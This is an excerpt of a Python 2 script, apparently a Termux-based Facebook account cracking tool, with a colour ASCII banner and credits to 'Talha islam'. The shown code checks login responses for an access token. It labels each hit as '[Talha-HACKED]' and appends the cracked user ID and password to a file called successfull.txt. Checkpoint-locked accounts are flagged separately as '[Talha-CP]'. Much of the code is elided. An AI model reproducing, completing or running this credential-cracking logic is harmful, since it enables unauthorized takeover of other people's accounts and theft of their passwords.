...
\033[0;94m  _____     _ _           
\033[0;94m |_   _|_ _| | |__   __ _ 
\033[0;96m   | |/ _` | | '_ \ / _` |
\033[0;96m   | | (_| | | | | | (_| |
\033[0;96m   |_|\__,_|_|_| |_|\__,_|
""")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Talha islam'
    print '\033[0;94mFACEBOOK : Termux teacher talha'
    print '\033[0;96mGITHUB   : TermuxTalha'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Talha-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Talha-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
